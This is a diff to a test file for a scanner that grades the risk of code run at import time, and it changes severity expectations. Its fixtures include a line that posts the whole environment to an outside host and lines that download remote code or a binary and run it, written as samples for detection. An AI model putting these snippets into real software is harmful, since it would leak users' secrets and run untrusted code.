@@ -63,8 +63,14 @@ test("import-time grading", () => {
     [["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"]);
   const telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n";
   assert.deepEqual(importTimeRisk(telemetry)[0], []);
+  // 2.17: what no library sends when it is loaded, sent anywhere; a client's own key, to its service, is not a finding
   const harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n";
-  assert.equal(importTimeSeverity(importTimeRisk(harvest)[0]), "MAJOR");
+  assert.equal(importTimeSeverity(importTimeRisk(harvest)[0]), "CRITICAL");
+  const one = "import os, requests\nrequests.post('https://api.invalid/c', headers={'key': os.environ['EXAMPLE_KEY']})\n";
+  assert.deepEqual(importTimeRisk(one)[0], []);
+  const binary = "const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
+    + "execFileSync(dst, ['--version']);\n";
+  assert.equal(importTimeSeverity(importTimeRisk(binary)[0]), "MAJOR");
   const pyRun = "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
     + "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n";
   assert.equal(importTimeSeverity(importTimeRisk(pyRun)[0]), "CRITICAL");
